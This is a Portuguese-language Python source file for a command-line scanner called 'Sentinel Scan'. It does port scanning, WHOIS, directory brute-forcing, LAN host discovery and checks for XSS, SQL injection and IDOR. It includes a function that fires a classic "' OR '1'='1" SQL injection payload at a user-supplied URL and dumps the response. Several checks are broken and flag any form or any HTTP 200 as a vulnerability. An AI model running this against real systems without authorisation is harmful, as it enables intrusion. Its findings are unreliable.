import socket
import pyfiglet
import requests
import whois
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, quote
import os
import time
from ipwhois import IPWhois
import nmap
import netifaces
from scapy.all import ARP, Ether, srp

text = "Sentinel  Scan"
font = pyfiglet.Figlet()

banner = font.renderText(text)
print(banner)


# Exibe os comandos disponíveis
def show_commands():
    print("Comandos disponíveis:\n")
    print("'ss' or 'sentinel scan' - Exibir tela inicial\n")
    print("'commands' - Exibir comandos disponíveis'\n")
    print("'ss ip' - Obter o IP do servidor\n")
    print("'ss whois' - Realizar WHOIS\n")
    print("'ss -p' - Escanear todas as portas\n")
    print("'ss -x' - Verificar vulnerabilidade de XSS\n")
    print("'ss -s' - Verificar vulnerabilidade de SQL injection\n")
    print("'ss -e -M' - Explorar vulnerabilidade (SQLi)\n")
    print("'ss -i' - Verificar vulnerabilidade de IDOR\n")
    print("'ss -v' - Verificar se há vulnerabilidade XSS, IDOR e SQL injection\n")
    print("'ss --w -I' - Obter todos os IPs conectados na rede Wi-Fi e informações dos dispositivos\n")
    print("'ss dir -w (wordlist)' - Testar possíveis diretórios do site usando uma wordlist\n")
    print("'ss dir -p' - Testar possíveis diretórios pré-definidos\n")
    print("'info' - Mostrar informações sobre o programa\n")
    print("'clear' - Limpar a tela\n")
    print("'exit' - Sair\n\n\n")
    
    print("Se caso na hora de fazer o scan, der algum erro quando você informa a url, tente iniciar o script novamente e colocar sem 'http' ou 'https' \n")

show_commands()


def obter_ip_local():
    try:
        nome_do_host = socket.gethostname()
        ip_local = socket.gethostbyname(nome_do_host)
        return ip_local
    except Exception as endereco:
        print(f"Erro ao obter o endereço IP local: {endereco}")
        return None

def get_wifi_ips():
    try:
        # Obtém o endereço IP local da rede Wi-Fi
        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
        ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']

        # Faz uma varredura na rede para encontrar os IPs dos dispositivos conectados
        nm = nmap.PortScanner()
        nm.scan(hosts=f"{ip}/24", arguments='-F')  # Escaneia a rede usando apenas as 100 portas mais comuns
        hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]  # Lista de tuplas (IP, status)

        # Filtra apenas os IPs que estão com status 'up'
        up_hosts = [ip for ip, status in hosts_list if status == 'up']

        return up_hosts
    except Exception as e:
        print(f"Ocorreu um erro ao obter os IPs da rede Wi-Fi: {e}")
        return []

def get_os_version(ip):
    try:
        # Faz uma consulta WHOIS para obter informações do IP
        obj = IPWhois(ip)
        results = obj.lookup_rdap()

        # Obtém informações do sistema operacional e a versão
        os_version = results.get('asn_description', 'Desconhecido')
        return os_version
    except Exception as e:
        print(f"Ocorreu um erro ao obter informações do sistema operacional: {e}")
        return 'Desconhecido'

def get_device_type(os_version):
    # Algumas palavras-chave para identificar o tipo de dispositivo
    if 'android' in os_version.lower():
        return 'Celular'
    elif 'iphone' in os_version.lower():
        return 'iPhone'
    elif 'mac os' in os_version.lower():
        return 'Mac'
    elif 'linux' in os_version.lower():
        return 'PC/Linux'
    elif 'windows' in os_version.lower():
        return 'PC/Windows'
    else:
        return 'Desconhecido'   
    

def scan_ports(url, ports):
    try:
        # Obtém o IP da URL
        ip = socket.gethostbyname(url)
        # Loop através das portas e verifica se elas estão abertas
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                print(f"A porta {port} está aberta.")
            else:
                print(f"A porta {port} está fechada.")
            sock.close()
    except Exception as e:
        print(f"Ocorreu um erro inesperado: {e}")

def get_server_ip(url):
    try:
        # Obtém o IP do servidor
        ip = socket.gethostbyname(url)
        print(f"O IP do servidor {url} é: {ip}")
    except socket.gaierror:
        print("Erro ao obter o IP do servidor. Verifique a URL e a conexão com a Internet.")
    except Exception as e:
        print(f"Ocorreu um erro inesperado: {e}")

def get_subdomains(url):
    try:
        # Obtém o IP do servidor principal
        main_ip = socket.gethostbyname(url)

        # Obtém todos os endereços IP associados aos subdomínios
        subdomains = [f"{subdomain}: {socket.gethostbyname(subdomain)}" for subdomain in socket.gethostbyname_ex(url)[1]]
        
        print("\nSubdomínios encontrados:\n")
        for subdomain in subdomains:
            print(subdomain)

    except socket.gaierror:
        print("Erro ao obter informações de subdomínios. Verifique a URL e a conexão com a Internet.")
    except Exception as e:
        print(f"Ocorreu um erro inesperado: {e}")

def dir_scan(url, wordlist):
    try:
        # Carrega a wordlist e lê as linhas com os possíveis diretórios
        with open(wordlist, 'r') as file:
            directories = file.read().splitlines()

        # Loop através dos possíveis diretórios e verifica se eles existem
        for directory in directories:
            full_url = url + "/" + directory
            response = requests.get(full_url)
            if response.status_code == 200:
                print(f"Diretório encontrado: {full_url}")
            else:
                print(f"Diretório não encontrado: {full_url}")
    except requests.exceptions.RequestException as e:
        print("Erro ao fazer a requisição. Verifique a URL e a conexão com o servidor.")
    except FileNotFoundError:
        print(f"Arquivo '{wordlist}' não encontrado.")
    except Exception as e:
        print(f"Ocorreu um erro inesperado: {e}")



def predefined_dir_scan(url):
    try:
        # Lista de possíveis diretórios
        directories = [
            "admin", "login", "index.html", "index.php", 
            "script.py", "login.php", "instagram", "config", "backup", "test",
            "data", "uploads", "images", "assets", "media",
            "css", "js", "fonts", "docs", "downloads",
            "lib", "include", "cgi-bin", "tmp", "backup",
            "db", "secret", "private", "public", "log",
            "error", "cache", "temp", "uploads", "config",
            "backup", "old", "temp", "temporary", "backup",
            "img", "upload", "uploads", "backup", "temp",
            "temporary", "secure", "adminpanel", "adm", "system",
            "cfg", "config", "setup", "install", "setup",
            "phpinfo", "readme", "license", "phpmyadmin", "pma",
            "mysql", "database", "sql", "backup", "db",
            "database_backup", "test", "demo", "example", "samples",
            "doc", "documentation", "download", "downloads",
            "img", "image", "images", "photo", "photos",
            "css", "style", "styles", "stylesheet", "static",
            "js", "javascript", "script", "scripts", "jslib",
            "lib", "library", "src", "source", "inc",
            "include", "includes", "res", "resources", "dist",
            "public", "public_html", "web", "webroot", "html",
            "log", "logs", "tmp", "temp", "cache",
            "backup", "config", "conf", "private", "data",
            "upload", "uploads", "file", "files", "media",
            "test", "demo", "example", "examples", "test",
            "temp", "backup", "backup_files", "assets", "resource",
            "resources", "secret", "hidden", "login", "admin",
            "adm", "administrator", "sysadmin", "system", "login",
            "auth", "authentication", "session", "sessions", "signin",
            "signout", "signup", "register", "users", "user",
            "accounts", "account", "profile", "myaccount", "myaccount",
            "manage", "adminpanel", "panel", "control", "cp",
            "dashboard", "config", "configuration", "install", "setup",
            "phpinfo", "readme", "license", "error", "errors",
            "404", "403", "500", "error_log", "debug",
            "logs", "temp", "temporary", "tmp", "cache",
            "uploads", "backup", "phpmyadmin", "pma", "mysql",
            "database", "db", "sql", "backup", "database_backup",
            "cgi-bin", "cgi-bin2", "scripts", "html", "htdocs",
            "public", "public.html", "www", "files", "uploads",
            "images", "img", "documents", "downloads", "upload", "style.css", "cpanel"
        ]

        # Loop através dos possíveis diretórios e verifica se eles existem
        for directory in directories:
            full_url = url + "/" + directory
            response = requests.get(full_url)
            if response.status_code == 200:
                print(f"Diretório encontrado: {full_url}")
            else:
                print(f"Diretório não encontrado: {full_url}")
    except requests.exceptions.RequestException as e:
        print("Erro ao fazer a requisição. Verifique a URL e a conexão com o servidor.")
    except Exception as e:
        print(f"Ocorreu um erro inesperado: {e}")



def get_subdomains(url):
    try:
        # Obtém o IP do servidor principal
        main_ip = socket.gethostbyname(url)

        # Obtém todos os endereços IP associados aos subdomínios
        subdomains = [f"{subdomain}: {socket.gethostbyname(subdomain)}" for subdomain in socket.gethostbyname_ex(url)[1]]
        
        print("\nSubdomínios encontrados:\n")
        for subdomain in subdomains:
            print(subdomain)

    except socket.gaierror:
        print("Erro ao obter informações de subdomínios. Verifique a URL e a conexão com a Internet.")
    except Exception as e:
        print(f"Ocorreu um erro inesperado: {e}")

# Função para explorar a vulnerabilidade de injeção de SQL
def exploit_sql_injection(url, vulnerable_parameter):
    # Inserção do payload para exploração de injeção de SQL
    payload = f"' OR '1'='1' -- "
    # Construção da URL com o payload injetado no parâmetro vulnerável
    target_url = f"{url}?{vulnerable_parameter}={payload}"

    # Armazena o payload injetado para uso posterior
    injected_payload = payload

    try:
        # Realiza a requisição HTTP com o payload injetado
        response = requests.get(target_url)

        if response.status_code == 200:
            # A resposta contém os dados do banco de dados ou uma mensagem que indica sucesso na exploração
            print("\nVulnerabilidade de injeção de SQL explorada com sucesso!")
            print("Dados obtidos:")
            print(response.text)

            # Exibe informações adicionais sobre a resposta
            print("\nInformações adicionais:")
            print(f" - URL: {response.url}")
            print(f" - Código de status: {response.status_code}")
            print(f" - Tamanho da resposta: {len(response.text)} bytes")
            print(f" - Cabeçalhos da resposta: {response.headers}")
            print(f" - Cookies da resposta: {response.cookies}")
            print(f" - Servidor: {response.headers.get('server')}")
            print(f" - Tipo de conteúdo: {response.headers.get('content-type')}")

            # Analisa o HTML da resposta para obter mais informações relevantes
            soup = BeautifulSoup(response.text, "html.parser")

            # Obtém os formulários presentes na página
            forms = soup.find_all("form")
            if forms:
                print(f" - Formulários encontrados na página: {len(forms)}")
                for form in forms:
                    print(f"   - Action do formulário: {form.get('action')}")
                    print(f"   - Método do formulário: {form.get('method')}")

            # Obtém os links presentes na página
            links = soup.find_all("a")
            if links:
                print(f" - Links encontrados na página: {len(links)}")
                for link in links:
                    print(f"   - URL do link: {link.get('href')}")

            # Outras informações adicionais relevantes podem ser obtidas de acordo com a estrutura da página

            # Retornar o payload injetado e os dados da resposta
            return injected_payload, response.text
        else:
            print("\nA exploração falhou. A vulnerabilidade de injeção de SQL pode não estar presente ou o servidor rejeitou a solicitação.")
            return None, None
    except requests.exceptions.RequestException as e:
        print("\nErro ao fazer a requisição. Verifique a URL e a conexão com o servidor.")
        return None, None
    except Exception as e:
        print(f"\nOcorreu um erro inesperado: {e}")
        return None, None
    
def metasploit_scan():
    try:
        print("\nIniciando o scan de penetração semelhante ao Metasploit...\n")

        # Vamos supor que a vulnerabilidade de injeção de SQL esteja no parâmetro 'id' de uma URL
        url = input("Digite a URL do site vulnerável: ")
        vulnerable_parameter = "id"

        # Realiza a exploração da vulnerabilidade de injeção de SQL
        exploit_sql_injection(url, vulnerable_parameter)

    except Exception as e:
        print("Ocorreu um erro durante o scan de penetração: ", e)


def perform_whois(url):
    try:
        # Realiza a função do whois
        domain = whois.whois(url)
        print("\n\nInformações WHOIS:\n\n")
        print(f"Nome do domínio: {domain.domain_name}\n")
        print(f"Subdomínios: ")
        get_subdomains(url)
        print(f"\nOrganização: {domain.org}\n")
        print(f"Registrante: {domain.registrar}\n")
        print(f"Servidores de nome: {domain.name_servers}\n")
        print(f"Data de criação: {domain.creation_date}\n")
        print(f"Data de expiração: {domain.expiration_date}\n")
        print(f"Data de atualização: {domain.updated_date}\n")

        # Exibe os status
        print(f"Status: {''.join(domain.status)}")

        print(f"\nEmail do registrante: {domain.emails}")
        print(f"\nPaís: {domain.country}")
        print(f"\nEstado: {domain.state}")
        print(f"\nCidade: {domain.city}")
        print(f"\nEndereço: {domain.address}")
        print(f"\nCódigo postal: {domain.zipcode}")

    except whois.parser.PywhoisError as e:
        print("Erro ao obter informações WHOIS. Verifique a URL e tente novamente.")
    except Exception as e:
        print(f"Ocorreu um erro inesperado: {e}")


def check_xss(url):
    try:
        # Verifica se há vulnerabilidade de XSS
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")

        if len(forms) > 0:
            print("Vulnerabilidade de XSS encontrada!")
            print("Detalhes:\n")
            for form in forms:
                action = form.get("action")
                method = form.get("method")
                inputs = form.find_all("input")
                print(f"Formulário encontrado:")
                print(f" - Action: {action}")
                print(f" - Método: {method}\n")

                for input_field in inputs:
                    input_name = input_field.get("name")
                    input_type = input_field.get("type")
                    input_value = input_field.get("value", "")
                    input_placeholder = input_field.get("placeholder", "")
                    input_label = input_field.find_previous("label")

                    print(f"   Campo de entrada:\n")
                    print(f"   - Nome: {input_name}")
                    print(f"   - Tipo: {input_type}")
                    print(f"   - Valor: {input_value}")
                    print(f"   - Placeholder: {input_placeholder}\n")

                    if input_label:
                        label_text = input_label.get_text().strip()
                        print(f"   - Rótulo: {label_text}")

                    xss_type = get_xss_type(input_field)
                    print(f"   - Tipo de XSS: {xss_type}\n")

                    print(f"   - Relatório: A vulnerabilidade de XSS do tipo '{xss_type}' pode ser explorada injetando código malicioso nos campos de entrada acima, permitindo a execução de scripts não autorizados no contexto do usuário. Recomenda-se implementar a filtragem e a validação adequadas para evitar a inserção de scripts maliciosos e garantir a segurança da aplicação.")

                    print()

            # Como testar essa falha:
            print("   Como testar essa falha:\n")
            print("      1. Acesse o site vulnerável e localize os formulários com campos de entrada.")
            print("      2. Tente inserir um código malicioso no campo de entrada.")
            print("      3. Se o código malicioso for executado e você notar um comportamento anômalo, a vulnerabilidade de XSS está presente.")
            print("      4. Caso nada aconteça ou você veja a mensagem 'Nenhuma vulnerabilidade de XSS encontrada', o site pode estar seguro contra essa vulnerabilidade.")
            print("      5. Lembre-se de que testar sites sem permissão pode ser ilegal e antiético. Sempre obtenha autorização antes de realizar testes de segurança.")

        else:
            print("Nenhuma vulnerabilidade de XSS encontrada.")
    except requests.exceptions.RequestException as e:
        print("Erro ao fazer a requisição. Verifique a URL e a conexão com o servidor.")
    except Exception as e:
        print(f"Ocorreu um erro inesperado: {e}")



def get_xss_type(input_field):
    input_type = input_field.get("type")
    input_value = input_field.get("value", "")

    if input_type == "text" or input_type == "search":
        if input_value.startswith("<script") and input_value.endswith("</script>"):
            return "XSS Armazenado"
        elif input_value.startswith("javascript:"):
            return "XSS Refletido"
        else:
            return "XSS DOM"

    return "Desconhecido"


def check_sql_injection(url):
    try:
        # Verifica se há vulnerabilidade de SQL injection
        payload = "' OR '1'='1"
        encoded_payload = quote(payload)  # Escapa o payload SQL corretamente
        response = requests.get(url + encoded_payload)

        if payload in response.text:
            print("Vulnerabilidade de SQL injection encontrada!")
            print("Detalhes:")
            print(f" - URL vulnerável: {url}")
            print(f" - Payload injetado: {payload}")
            print(" - Relatório: A vulnerabilidade de SQL injection pode ser explorada inserindo código SQL malicioso em campos de entrada, permitindo a execução não autorizada de comandos SQL. Recomenda-se implementar práticas seguras de codificação, como o uso de parâmetros parametrizados ou consultas preparadas, para evitar a injeção de SQL e proteger o sistema contra ataques.")
        else:
            print("Nenhuma vulnerabilidade de SQL injection encontrada.")
    except requests.exceptions.RequestException as e:
        print("Erro ao fazer a requisição. Verifique a URL e a conexão com o servidor.")
    except Exception as e:
        print(f"Ocorreu um erro inesperado: {e}")



def check_idor(url):
    try:
        # Verifica se há vulnerabilidade de Insecure Direct Object Reference (IDOR)
        response = requests.get(url)

        if response.status_code == 200:
            print("Vulnerabilidade de IDOR encontrada!")
            print("Detalhes:")
            print(f" - URL vulnerável: {url}")

            # Obtém os parâmetros da URL
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            print(f" - Parâmetros utilizados: {query_params}\n")

            print("\nInformações adicionais:")
            print("  Ao acessar a URL com parâmetros não autorizados, foram encontrados objetos ou recursos que não deveriam ser acessíveis a todos os usuários. Isso pode permitir o acesso a dados confidenciais ou ações não permitidas. Recomenda-se implementar uma estratégia de controle de acesso adequada, garantindo que as autorizações sejam verificadas corretamente e que apenas usuários autorizados possam acessar recursos confidenciais.")
        else:
            print("Nenhuma vulnerabilidade de IDOR encontrada.")
    except Exception as e:
        print(f"Ocorreu um erro inesperado: {e}")
        

# Loop infinito para continuar pedindo comandos
while True:
    # Solicita o comando ao usuário
    command = input("\n>>> ")

    if command == "info":
        print("""\n\n   Bem-vindo ao Sentinel Scan, a poderosa ferramenta para profissionais de segurança da informação. Nosso programa foi desenvolvido para ajudar você a         identificar e mitigar vulnerabilidades em sistemas e redes, garantindo a proteção de informações sensíveis. Com recursos avançados e uma interface intuitiva, o Sentinel Scan é o aliado perfeito na sua busca pela segurança cibernética.

    Principais recursos do Sentinel Scan:

        Varredura de portas: Identifique as portas abertas em um determinado sistema, permitindo que você conheça quais serviços estão disponíveis para acesso externo. Com essa informação, você pode tomar medidas proativas para fechar portas não utilizadas ou configurá-las adequadamente para evitar possíveis ataques.

        Rastreamento de IP: Obtenha o endereço IP correspondente a uma URL fornecida. Com essa funcionalidade, você poderá identificar a localização geográfica de um servidor, analisar informações relacionadas a ele e melhorar sua compreensão dos ativos que compõem sua infraestrutura.

        Consulta Whois: Obtenha informações detalhadas sobre o registro de um domínio, incluindo dados de registro, informações de contato e data de expiração. O recurso Whois do Sentinel Scan permite que você investigue a propriedade e a autenticidade de um domínio, ajudando a identificar possíveis ameaças.

        Verificação de XSS (Cross-Site Scripting): Identifique vulnerabilidades de XSS em um aplicativo da web. O Sentinel Scan analisa minuciosamente as entradas de usuário em um site para identificar possíveis vetores de ataque de XSS, permitindo que você tome medidas corretivas e evite a execução de scripts maliciosos em navegadores dos usuários.

        Verificação de SQLi (Injeção de SQL): Detecte possíveis vulnerabilidades de injeção de SQL em sistemas de banco de dados. Com o Sentinel Scan, você pode identificar pontos fracos em consultas SQL e tomar medidas para proteger suas aplicações contra ataques que explorem essas vulnerabilidades.

        Verificação de IDOR (Insecure Direct Object Reference): Identifique possíveis falhas de IDOR em um aplicativo da web. Com essa verificação, você pode descobrir se há objetos referenciados diretamente, sem a devida autenticação ou autorização, e tomar as medidas necessárias para corrigir essas vulnerabilidades.

        Lembre-se de que o Sentinel Scan é uma ferramenta poderosa, mas a segurança cibernética é um esforço contínuo. Recomendamos que você realize verificações regulares e mantenha-se atualizado com as melhores práticas de segurança. Estamos comprometidos em ajudar você a proteger dados valiosos e garantir a integridade dos seus sistemas.

        Conte com o Sentinel Scan para aprimorar sua postura de segurança da informação e fortalecer suas defesas contra ameaças cibernéticas. Juntos, podemos construir um ambiente digital mais seguro e confiável.\n\n""")

    elif command == "ss":
        print(banner)
        show_commands()

    elif command == "sentinel scan":
        print(banner)
        show_commands()

    elif command == "commands":
        show_commands()

    elif command == "ss -v": # Verifica se há XSS, IDOR e SQLi
        url = input("Digite a URL do domínio: ")
        print("Escaneando vulnerabilidades (XSS, IDOR e SQLi)... ")
        print("\n\n")
        time.sleep(1)
        check_xss(url)
        print("\n\n")
        time.sleep(1)
        check_sql_injection(url)
        print("\n\n")
        time.sleep(1)
        check_idor(url)
        print("\n\n")
    elif command == "ss -e -M":
        metasploit_scan()
    elif command == "ss --w -I":
        ip_local = obter_ip_local()
        if ip_local:
            print(f"IP da rede Wi-Fi: {ip_local}")
        else:
            print("Falha ao obter o IP da rede Wi-Fi.")
            print("Outras funcionalidades do comando 'ss --w -I':")
            print("1. Obter todos os IPs conectados na rede Wi-Fi.")
            print("2. Exibir o sistema operacional, versão do SO, latitude e longitude para cada IP.")
            print("3. Identificar se o dispositivo é um celular, PC, notebook, etc.")
            print("Buscando IPs conectados na rede Wi-Fi...")
        wifi_ips = get_wifi_ips()



        if wifi_ips:
            print("\nIPs conectados na rede Wi-Fi:\n")
            for ip in wifi_ips:
                os_version = get_os_version(ip)
                device_type = get_device_type(os_version)
                print(f"IP: {ip} | Sistema Operacional: {os_version} | Tipo de Dispositivo: {device_type}\n")
        else:
            print("Nenhum dispositivo encontrado na rede Wi-Fi.")



    elif command == "clear":
        if os.name == "posix":
            os.system("clear")  # Limpa a tela no Linux/macOS
        else:
            os.system("cls")  # Limpa a tela no Windows

    elif command.startswith("ss"):
        command_parts = command.split()

        if len(command_parts) >= 2:
            subcommand = command_parts[1]

            if subcommand == "-p":
                url = input("Digite a URL que deseja escanear: ")
                print("Escaneando todas as portas...")
                scan_ports(url, range(1, 65536))

            elif subcommand.isdigit():
                url = input("Digite a URL que deseja escanear: ")
                ports = [int(port) for port in subcommand.split(",")]
                print("Escaneando portas específicas...")
                scan_ports(url, ports)

            elif subcommand == "ip":
                url = input("Digite a URL do servidor: ")
                get_server_ip(url)

            elif subcommand == "whois":
                url = input("Digite a URL do domínio: ")
                perform_whois(url)

            elif subcommand == "-x":
                url = input("Digite a URL do site: ")
                check_xss(url)

            elif subcommand == "-s":
                url = input("Digite a URL do site: ")
                check_sql_injection(url)

            elif subcommand == "-i":
                url = input("Digite a URL do site: ")
                check_idor(url)
          
            elif command == "ss dir -p":
                # Opção para testar 500 possíveis diretórios pré-definidos
                url = input("Digite a URL do site: ")
                print("Escaneando 500 possíveis diretórios...")
                predefined_dir_scan(url)

            elif subcommand == "dir":
                # Verifica se a opção -w e o caminho da wordlist estão no comando
                if "-w" in command_parts:
                    wordlist_index = command_parts.index("-w") + 1
                    if len(command_parts) > wordlist_index:
                        wordlist_path = command_parts[wordlist_index]
                        url = input("Digite a URL do site: ")
                        print("Escaneando diretórios...")
                        dir_scan(url, wordlist_path)
                    else:
                        print("Caminho da wordlist não informado. Por favor, insira o caminho completo da wordlist após a opção -w.")
                else:
                    print("Comando inválido. Por favor, informe a opção -w seguida do caminho da wordlist.")
            else:
                print("Comando inválido. Por favor, tente novamente.")

        else:
            print("Comando inválido. Por favor, tente novamente.")

    elif command == "exit":
        break

    else:
        print("Comando inválido. Por favor, tente novamente.")
